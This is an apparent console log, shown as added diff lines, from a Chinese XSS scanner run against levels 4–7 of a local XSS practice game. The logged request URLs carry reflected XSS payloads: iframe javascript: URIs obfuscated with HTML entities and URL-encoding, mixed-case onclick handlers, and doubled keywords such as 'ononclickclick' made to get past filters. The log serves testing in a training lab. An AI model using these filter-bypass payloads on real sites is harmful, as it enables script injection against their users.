+[32m[2020-04-02 20:12:40,044] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 20:12:40,091] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level5.php?keyword=yy78pq"><iframe src="javascript:alert(1)[0m
+[32m[2020-04-02 20:13:11,207] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 20:13:11,219] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 20:13:11,234] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 20:13:11,269] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level5.php?keyword=[0m
+[32m[2020-04-02 20:13:37,810] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 20:13:37,823] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 20:13:37,840] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 20:13:37,875] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level5.php?keyword=[0m
+[32m[2020-04-02 20:18:13,258] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 20:18:13,281] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 20:18:13,291] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 20:18:13,362] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level5.php?keyword=yy78pq"><iframe src=&#x6a&#x61&#x76&#x61&#x73cr&#x69&#x70&#x74:ale&#x72&#x74&#x281)[0m
+[32m[2020-04-02 20:18:42,995] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 20:18:43,017] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 20:18:43,035] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 20:18:43,064] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level5.php?keyword=yy78pq%22%3E%3Ciframe%20src%3Dj%26%23x61vas%26%23x63%26%23x72%26%23x69pt%3A%26%23x61le%26%23x72t%26%23x281%26%23x29[0m
+[32m[2020-04-02 20:23:10,814] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 20:23:10,838] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 20:23:10,855] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 20:23:47,733] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 20:23:47,749] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 20:23:47,759] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 20:24:38,104] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 20:24:38,134] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 20:24:38,211] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 20:24:38,249] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level5.php?keyword=yy78pq%22%3E%3Ciframe%20src%3D%22j%26%23x61%26%23x76as%26%23x63rip%26%23x74%3Aale%26%23x72t%26%23x28%26%23x31%26%23x29[0m
+[32m[2020-04-02 20:28:36,464] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 20:28:36,476] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 20:28:36,483] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 20:28:36,515] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level5.php?keyword=yy78pq%22%3E%3Ciframe%20src%3D%22j%26%23x61%3Bva%26%23x73%3B%26%23x63%3Bript%3A%26%23x61%3Ble%26%23x72%3B%26%23x74%3B%26%23x28%3B1%29[0m
+[32m[2020-04-02 21:27:29,988] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 21:27:30,053] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 21:27:30,059] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 21:27:30,090] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level4.php?keyword=yy78pq%22%3E%3Ciframe%20src%3D%22javascr%26%23x69%3B%26%23x70%3Bt%3Aalert%281%26%23x29%3B[0m
+[32m[2020-04-02 21:30:59,279] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 21:30:59,311] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 21:30:59,345] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 21:40:28,066] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 21:40:30,476] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 21:40:30,505] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 21:40:30,641] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level4.php?keyword=yy78pq%22%3E%3Ciframe%20src%3D%22ja%26%23x76%3B%26%23x61%3Bsc%26%23x72%3B%26%23x69%3B%26%23x70%3B%26%23x74%3B%26%23x3a%3Bal%26%23x65%3B%26%23x72%3B%26%23x74%3B%28%26%23x31%3B%26%23x29%3B[0m
+[32m[2020-04-02 21:41:14,098] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 21:41:14,169] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 21:41:14,198] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 21:41:14,347] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level4.php?keyword=yy78pq%22%3E%3Ciframe%20src%3D%22%26%23x6a%3Ba%26%23x76%3Bascr%26%23x69%3Bpt%3A%26%23x61%3Bl%26%23x65%3B%26%23x72%3Bt%26%23x28%3B1%26%23x29%3B[0m
+[32m[2020-04-02 21:49:36,361] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 21:49:36,428] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 21:49:36,469] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 21:49:36,612] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level4.php?keyword=yy78pq%22%3E%3Ciframe%20src%3D%22%26%23x6a%3B%26%23x61%3Bv%26%23x61%3Bsc%26%23x72%3B%26%23x69%3B%26%23x70%3Bt%3Aa%26%23x6c%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B%28%26%23x31%3B%26%23x29%3B[0m
+[32m[2020-04-02 21:59:08,998] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 21:59:09,066] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 21:59:09,110] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 21:59:09,212] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level4.php?keyword=yy78pq%2522OncLick%253D%2522alert%25281%2529[0m
+[32m[2020-04-02 22:00:20,682] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 22:00:20,761] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 22:00:20,794] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 22:00:20,899] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level4.php?keyword=yy78pq%22onclick%3D%22alert%281%29[0m
+[32m[2020-04-02 22:02:04,831] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 22:02:12,735] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 22:02:12,804] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 22:02:12,834] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 22:02:12,964] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level6.php?keyword=yy78pq%22%3E%3Ciframe%20src%3D%22%26%23x6a%3B%26%23x61%3Bv%26%23x61%3B%26%23x73%3B%26%23x63%3Brip%26%23x74%3B%26%23x3a%3B%26%23x61%3Bl%26%23x65%3B%26%23x72%3Bt%26%23x28%3B%26%23x31%3B%29[0m
+[32m[2020-04-02 22:03:50,173] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 22:03:50,259] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 22:03:50,314] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 22:03:50,467] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level6.php?keyword=[0m
+[32m[2020-04-02 22:04:18,876] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 22:04:18,937] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 22:04:18,961] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 22:08:04,776] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 22:08:04,842] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 22:08:04,870] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 22:08:05,004] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level6.php?keyword=yy78pq%22%3E%3Ciframe%20src%3D%22j%26%23x61%3Bva%26%23x73%3B%26%23x63%3B%26%23x72%3B%26%23x69%3Bp%26%23x74%3B%3A%26%23x61%3Bler%26%23x74%3B%28%26%23x31%3B%29[0m
+[32m[2020-04-02 22:09:58,399] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 22:09:58,458] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 22:09:58,487] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 22:09:58,644] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level6.php?keyword=yy78pq%22%3E%3Ciframe%20src%3D%22%26%23x6a%3B%26%23x61%3B%26%23x76%3Bas%26%23x63%3B%26%23x72%3Bipt%26%23x3a%3Ba%26%23x6c%3Be%26%23x72%3B%26%23x74%3B%28%26%23x31%3B%26%23x29%3B[0m
+[32m[2020-04-02 22:10:24,654] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 22:10:24,720] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 22:10:24,752] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 22:10:24,889] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level6.php?keyword=yy78pq%22%3E%3Ciframe%20src%3D%22%26%23x6a%3B%26%23x61%3Bva%26%23x73%3B%26%23x63%3Br%26%23x69%3Bpt%3A%26%23x61%3B%26%23x6c%3B%26%23x65%3B%26%23x72%3Bt%28%26%23x31%3B%29[0m
+[32m[2020-04-02 22:10:28,756] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 22:10:28,846] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 22:10:28,902] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 22:10:29,012] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level6.php?keyword=yy78pq%22oNclicK%3D%22alert%281%29[0m
+[32m[2020-04-02 22:22:02,765] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 22:22:02,829] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 22:22:02,866] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 22:22:02,971] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level6.php?keyword=yy78pq%22ONclick%3D%22alert%281%29[0m
+[32m[2020-04-02 22:27:15,781] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 22:27:15,840] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 22:27:15,876] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 22:27:15,997] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level6.php?keyword=yy78pq%22%3E%3Ciframe%20src%3D%22%26%23x6a%3Ba%26%23x76%3B%26%23x61%3Bs%26%23x63%3B%26%23x72%3Bi%26%23x70%3B%26%23x74%3B%26%23x3a%3B%26%23x61%3B%26%23x6c%3Bert%26%23x28%3B%26%23x31%3B%29[0m
+[32m[2020-04-02 22:28:26,097] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 22:28:26,149] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 22:28:26,174] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 22:28:26,278] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level6.php?keyword=yy78pq%22OncLick%3D%22alert%281%29[0m
+[32m[2020-04-02 22:29:28,311] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 22:29:28,391] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 22:29:28,417] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 22:29:28,544] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level7.php?keyword=yy78pq%22%3E%3Ciframe%20src%3D%22j%26%23x61%3B%26%23x76%3Ba%26%23x73%3Bc%26%23x72%3Bi%26%23x70%3B%26%23x74%3B%26%23x3a%3B%26%23x61%3Bl%26%23x65%3Br%26%23x74%3B%281%26%23x29%3B[0m
+[32m[2020-04-02 22:29:42,732] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 22:29:49,370] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 22:29:49,428] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 22:29:49,452] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 22:29:49,584] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level6.php?keyword=yy78pq%22%3E%3Ciframe%20src%3D%22%26%23x6a%3B%26%23x61%3B%26%23x76%3Bascr%26%23x69%3B%26%23x70%3B%26%23x74%3B%26%23x3a%3Bale%26%23x72%3Bt%26%23x28%3B1%29[0m
+[32m[2020-04-02 22:34:08,293] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 22:34:08,347] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 22:34:08,384] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 22:34:08,503] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level6.php?keyword=yy78pq%22oncliCK%3D%22alert%281%29[0m
+[32m[2020-04-02 22:34:09,729] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 22:34:09,791] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 22:34:09,816] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 22:34:09,909] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level6.php?keyword=yy78pq%22OncliCk%3D%22alert%281%29[0m
+[32m[2020-04-02 22:34:11,565] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 22:34:11,632] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 22:34:11,672] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 22:34:11,761] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level6.php?keyword=yy78pq%22onClIck%3D%22alert%281%29[0m
+[32m[2020-04-02 22:34:12,996] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 22:34:13,072] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 22:34:13,107] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 22:34:13,209] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level6.php?keyword=yy78pq%22OnClick%3D%22alert%281%29[0m
+[32m[2020-04-02 22:34:14,336] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 22:34:14,385] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 22:34:14,418] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 22:34:14,517] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level6.php?keyword=yy78pq%22oncliCK%3D%22alert%281%29[0m
+[32m[2020-04-02 22:34:15,584] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 22:34:15,646] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 22:34:15,676] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 22:34:15,776] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level6.php?keyword=yy78pq%22oNclIck%3D%22alert%281%29[0m
+[32m[2020-04-02 23:32:22,220] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 23:32:28,720] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 23:32:28,775] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 23:32:28,797] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 23:32:28,910] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level7.php?keyword=yy78pq%22%3E%3Ciframe%20src%3D%22java%26%23x73%3Bc%26%23x72%3Bi%26%23x70%3B%26%23x74%3B%3A%26%23x61%3Bl%26%23x65%3B%26%23x72%3Bt%28%26%23x31%3B%29[0m
+[32m[2020-04-02 23:39:38,154] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 23:39:38,211] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 23:39:38,245] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 23:39:38,392] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level7.php?keyword=yy78pq%22%3E%3Ciframe%20src%3D%22j%26%23x61%3Bv%26%23x61%3B%26%23x73%3B%26%23x63%3B%26%23x72%3B%26%23x69%3Bpt%3A%26%23x61%3Bl%26%23x65%3B%26%23x72%3B%26%23x74%3B%281%26%23x29%3B%3E[0m
+[32m[2020-04-02 23:40:27,142] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 23:40:27,185] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 23:40:27,206] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 23:41:37,105] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 23:41:37,167] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 23:41:37,200] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 23:41:37,301] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level7.php?keyword=yy78pq%22%3E%3Ciframe%20src%3D%22j%26%23x61%3B%26%23x76%3Ba%26%23x73%3Bcr%26%23x69%3B%26%23x70%3B%26%23x74%3B%26%23x3a%3B%26%23x61%3B%26%23x6c%3B%26%23x65%3Brt%28%26%23x31%3B%29%22%3E[0m
+[32m[2020-04-02 23:48:28,829] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 23:48:28,907] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 23:48:28,942] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 23:49:12,836] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 23:49:12,911] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 23:49:12,938] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 23:52:04,466] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 23:52:04,529] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 23:52:04,563] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 23:52:04,670] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level7.php?keyword=yy78pq%22onconclicklick%3D%22alert%281%29[0m
+[32m[2020-04-02 23:52:15,792] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 23:52:15,856] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 23:52:15,880] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 23:52:16,018] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level7.php?keyword=yy78pq%22onconclicklick%3D%22alert%281%29[0m
+[32m[2020-04-02 23:52:17,911] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 23:52:17,956] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 23:52:17,981] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 23:52:18,103] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level7.php?keyword=yy78pq%22onclick%3D%22alert%281%29[0m
+[32m[2020-04-02 23:53:08,310] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 23:53:08,369] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 23:53:08,390] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
+[32m[2020-04-02 23:53:08,520] [log.py:91] [log:__console] [INFO]- http://192.168.45.1/xss/xssgame/level7.php?keyword=yy78pq%22ononclickclick%3D%22alert%281%29[0m
+[32m[2020-04-02 23:53:10,564] [log.py:91] [log:__console] [INFO]- 开始检测xss[0m
+[32m[2020-04-02 23:53:10,618] [log.py:91] [log:__console] [INFO]- 检测xss第1个参数[0m
+[32m[2020-04-02 23:53:10,652] [log.py:91] [log:__console] [INFO]- [{'type': 'normal_data', 'text': '没有找到和yy78pq相关的结果.'}, {'type': 'normal_attr_value', 'text': '<input name=keyword  value="yy78pq">'}][0m
